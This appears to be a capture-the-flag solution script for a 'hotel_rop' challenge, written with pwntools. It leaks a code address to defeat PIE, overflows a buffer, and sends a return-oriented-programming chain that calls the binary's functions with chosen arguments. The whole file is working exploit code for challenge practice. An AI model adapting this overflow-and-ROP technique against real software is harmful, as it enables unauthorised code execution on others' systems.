from pwn import *

#elf = ELF('./hotel_rop_pie_patched')

p = remote("dctf1-chall-hotel-rop.westeurope.azurecontainer.io", 7480)
#p = process("./hotel_rop_pie_patched")
# pid = gdb.attach(p, gdbscript="""
#     x/x main
#     x/x vuln
#     x/x california
#     x/x silicon_valley
#     x/x loss
#     b * vuln
#     r
# """)

# ROP_gadgets
ret = 0x1016
pop_rdi = 0x140b
pop_rsi_r15 = 0x1409

# function offsets
main_offset = 0x136d
vuln_offset = 0x131e
california_offset = 0x11dc
silicon_valley_offset = 0x1283
loss_offset = 0x1185

# 28(?) + 4 + 8 = 40 Bytes of padding
# looks as if the compiler added a couple more bytes
payload = b"A" * 28
payload += p32(0x0)
payload += b"A" * 8

#print("Payload: {}".format(payload))
main_addr = p.recvline()[37:51]

base_addr = int(main_addr, 16) - main_offset
print(f"Base: {hex(base_addr)}")

main_addr = p64(base_addr + main_offset)
vuln_addr = p64(base_addr + vuln_offset)
california_addr = p64(base_addr + california_offset)
silicon_valley_addr = p64(base_addr + silicon_valley_offset)
loss_addr = p64(base_addr + loss_offset)

payload += california_addr
payload += silicon_valley_addr

payload += p64(base_addr + pop_rdi)
payload += p64(0x1337c0de)
payload += p64(base_addr + pop_rsi_r15)
payload += p64(0x0cb760000)
payload += p64(0x0)
payload += loss_addr

print(f"Final payload: {payload}")

p.sendlineafter("often?\n", payload)
p.interactive()
